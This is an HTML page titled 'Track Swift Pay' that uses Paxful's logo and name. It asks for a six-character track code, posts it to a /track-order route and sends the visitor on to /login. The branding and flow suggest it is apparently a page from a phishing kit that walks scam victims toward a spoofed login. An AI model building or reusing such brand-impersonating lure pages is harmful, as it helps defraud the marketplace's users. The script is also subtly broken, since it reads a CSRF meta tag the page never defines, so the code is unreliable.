<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Track Swift Pay</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Inter', sans-serif;
            margin: 0;
            background-color: #000;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            height: auto;
            font-weight: 400;
            line-height: 1.5;
        }

        .container {
            display: flex;
            flex-wrap: wrap;
            width: 100%;
            max-width: 1200px;
            align-items: flex-start;
            justify-content: center;
            padding: 0;
        }

        .back-button a {
            color: white;
            text-decoration: none;
        }

        .back-button {
            margin-bottom: 10px;
            font-size: 16px;
            color: white;
        }

        .illustration-section {
            display: none;
        }

        .illustration img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .logo {
            font-size: 30px;
            font-weight: 600;
            padding-top: 5px;
            margin: 0 0 20px 0;
        }

        .logo img {
            height: 24px;
        }

        .welcome-text {
            font-size: 2rem;
            font-weight: 600;
            margin-bottom: 10px;
            margin-top: 10px;
        }

        .signup-link {
            margin-bottom: 20px;
            font-size: 14px;
        }

        .signup-link a {
            color: white;
            text-decoration: none;
            font-weight: 600;
        }

        .input-group {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
        }

        .input-box {
            width: 50px;
            height: 50px;
            text-align: center;
            font-size: 24px;
            background-color: #1F1F1F;
            color: #fff;
            border: none;
            border-radius: 10px;
        }

        button {
            width: 100%;
            padding: 14px;
            background-color: #A8E239;
            color: #000;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            margin-top: 10px;
        }

        .forgot-password {
            margin-top: 5px;
            text-align: right;
            font-size: 14px;
        }

        .forgot-password a {
            color: #ECECEC;
            text-decoration: none;
        }

        .error-message {
            display: none;
            color: red;
            font-weight: bold;
        }

        @media (min-width: 768px) {
            .container {
                flex-direction: row;
                justify-content: space-between;
            }

            .login-section {
                width: 40%;
                text-align: left;
            }

            .illustration-section {
                display: flex;
                width: 50%;
                align-items: center;
                justify-content: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-section">
            <div class="logo">
                <img src="images/paxful.png" alt="Paxful Logo"> paxful
            </div>
            <div class="back-button">&lt; <a href="/">Back</a></div>
            <div class="welcome-text">Tracking Order</div>
            <div class="signup-link">Enter the track code</strong></div>
            <div class="signup-link">Track code</div>
            <div class="input-group code-inputs">
                <input type="text" maxlength="1" class="input-box" />
                <input type="text" maxlength="1" class="input-box" />
                <input type="text" maxlength="1" class="input-box" />
                <input type="text" maxlength="1" class="input-box" />
                <input type="text" maxlength="1" class="input-box" />
                <input type="text" maxlength="1" class="input-box" />
            </div>
            <!-- <div class="signup-link error-message">Incorrect track code. Please try again.</div> -->
            <div class="signup-link error-message"></div>
        </div>
        <div class="illustration-section">
            <div class="illustration">
                <img src="images/registersvg.png" alt="Illustration">
            </div>
        </div>
    </div>

    <script>
        const inputBoxes = document.querySelectorAll('.input-box');
        const errorMessage = document.querySelector('.error-message');

        inputBoxes.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value.length === 1 && index < inputBoxes.length - 1) {
                    inputBoxes[index + 1].focus();
                }

                const allFilled = Array.from(inputBoxes).every(box => box.value !== '');

                if (allFilled) {
                    const code = Array.from(inputBoxes).map(box => box.value).join('');
                    submitCode(code);
                    errorMessage.style.display = 'block'; // Show error message initially
                } else {
                    errorMessage.style.display = 'none'; // Hide if not all filled
                }
            });
        });

        function submitCode(code) {
            // 1. You can either redirect directly here (no API call):
            // window.location.href = '/login';  // Redirects immediately

            // 2. Or, if you need to make an API call first:
            fetch('/track-order', { // Your backend route
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content') // Get CSRF token
                },
                body: JSON.stringify({ code })
            })
            .then(response => {
                if (!response.ok) { // Check for HTTP errors (like 400, 500)
                    throw new Error(`HTTP error! status: ${response.status}`); // Throw error to be caught
                }
                return response.json(); // If response is ok, parse JSON
            })
            .then(data => {
                if (data.success) {
                    window.location.href = '/login'; // Redirect on successful API response
                } else {
                    errorMessage.style.display = 'block';
                    errorMessage.textContent = data.message || "An error occurred."; // Display error, including backend message if available
                }
            })
            .catch(error => {
                console.error('Error:', error);
                errorMessage.style.display = 'block';
                errorMessage.textContent = "A network error occurred. Please try again later."; // Show a more general error message
            });
        }
    </script>
</body>
</html>
